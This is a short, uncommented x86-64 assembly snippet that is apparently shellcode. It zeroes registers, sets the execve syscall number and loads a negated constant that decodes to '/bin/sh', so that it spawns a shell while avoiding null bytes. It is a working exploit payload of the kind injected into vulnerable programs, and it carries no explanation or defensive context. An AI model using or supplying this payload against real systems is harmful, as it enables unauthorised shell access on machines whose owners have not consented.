_start:

    xor esi, esi
    mul esi

    add al, 0x3b

    mov rdi, 0xff978cd091969dd1
    neg rdi

	push rdi
    push rsp
    pop rdi

    syscall
